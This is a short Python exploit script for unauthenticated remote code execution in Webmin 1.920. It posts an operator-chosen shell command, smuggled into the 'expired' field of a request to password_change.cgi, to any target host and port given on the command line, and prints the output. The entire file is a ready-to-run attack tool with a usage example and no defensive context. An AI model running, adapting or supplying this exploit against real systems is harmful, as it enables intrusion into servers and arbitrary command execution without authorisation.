#!/usr/bin/env python3

import requests
import sys

banner = """
███████ ████████  █████  ███    ██ 
██         ██    ██   ██ ████   ██ 
███████    ██    ███████ ██ ██  ██ 
     ██    ██    ██   ██ ██  ██ ██ 
███████    ██    ██   ██ ██   ████ 
                                    

    Webmin 1.920 - Unauthenticated Remote Code Execution
"""
userd = """
    Example :
        exploit.py http or https 192.168.1.114 10000 id
"""

def exploit(protocol, target, port, command) :
    if protocol == 'https':
        url = f"https://{target}:{port}/password_change.cgi"
        data = {
            'user' : 'NoThing',
            'pam' : '',
            'expired' : f'2|echo "";{command}'
        }
        header = {'Referer': F'https://{target}:{port}/session_login.cgi'}
        r = requests.post(url, data=data, headers=header ,verify=False)
        print(r.text)
    
    elif protocol == 'http':
        url = f"http://{target}:{port}/password_change.cgi"
        data = {
            'user' : 'NoThing',
            'pam' : '',
            'expired' : f'2|echo "";{command}'
        }
        header = {'Referer': F'http://{target}:{port}/session_login.cgi'}
        r = requests.post(url, data=data, headers=header ,verify=False)
        print(r.text)
    else:
        print('There is something wrong...!')

if __name__ == '__main__':
    try:
        #print(banner)
        protocol = sys.argv[1]
        target = sys.argv[2]
        port = sys.argv[3]
        command = sys.argv[4]
        print(banner)
        exploit(str(protocol), str(target), port, str(command))
    except:
        #print(banner)
        print(userd)